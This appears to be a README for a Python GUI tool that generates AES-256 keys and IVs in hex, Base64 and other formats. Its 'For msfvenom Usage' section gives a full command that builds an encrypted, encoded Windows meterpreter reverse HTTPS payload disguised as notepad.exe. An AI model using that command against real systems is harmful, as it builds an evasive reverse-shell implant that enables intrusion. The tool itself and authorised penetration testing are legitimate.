# AES-256 Key & IV Generator
A professional Python application for generating cryptographically secure AES-256 encryption keys and initialization vectors (IVs) with multiple output formats suitable for various applications including penetration testing tools like msfvenom.

![Python 3.6 Badge](https://img.shields.io/badge/python-3.6%252B-blue)
![MIT-License Badge](https://img.shields.io/badge/license-MIT-green)

## Features
Cryptographically Secure Generation: Uses os.urandom() for secure random number generation

## Multiple Output Formats:

Hexadecimal (ideal for msfvenom)

Base64 encoding

Escape sequences (for code implementation)

Raw bytes representation

## User-Friendly GUI: 

Intuitive interface built with Tkinter

Clipboard Integration: One-click copying of generated values

Cross-Platform Compatibility: Works on Windows, macOS, and Linux

## Installation
Clone or download this repository

Install required dependencies:

bash```
pip install -r requirements.txt```

## Usage

Run the application:

bash```
python aes_key_generator.py```

Generate new values:

Click "Generate New" to create a fresh AES-256 key and IV

Select output format:

Choose from Hex, Base64, Escape Sequences, or Raw Bytes

Copy values:

Use the "Copy Key", "Copy IV", or "Copy Both" buttons to transfer values to clipboard

## Requirements

The application requires the following dependencies (automatically installed via requirements.txt):

Python 3.6+

Tkinter (usually included with Python standard library)

## For msfvenom Usage

When using with msfvenom, select the **Hex format** and use the values with the appropriate flags:

bash```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=YOUR_IP LPORT=YOUR_PORT \
--encryption aes256 --encryption_key YOUR_KEY --encryption_iv YOUR_IV --encoder x64/xor_dynamic --iterations 5 --arch x64 --platform windows -f exe -o notepad.exe --timeout 65```

## Security Considerations

Always generate new keys and IVs for each encryption operation

Never reuse the same key/IV combination

Store keys securely using appropriate secret management solutions

This tool uses cryptographically secure random generation (os.urandom)

## Project Structure
text
aes-key-generator/
├── aes_key_generator.py  # Main application file
├── requirements.txt      # Python dependencies
└── README.md            # This file

## License

This project is licensed under the **MIT License** - see the LICENSE file for details.

## Disclaimer
This tool is intended for educational and legitimate security testing purposes only. Always ensure you have proper authorization before using encryption tools on any system.


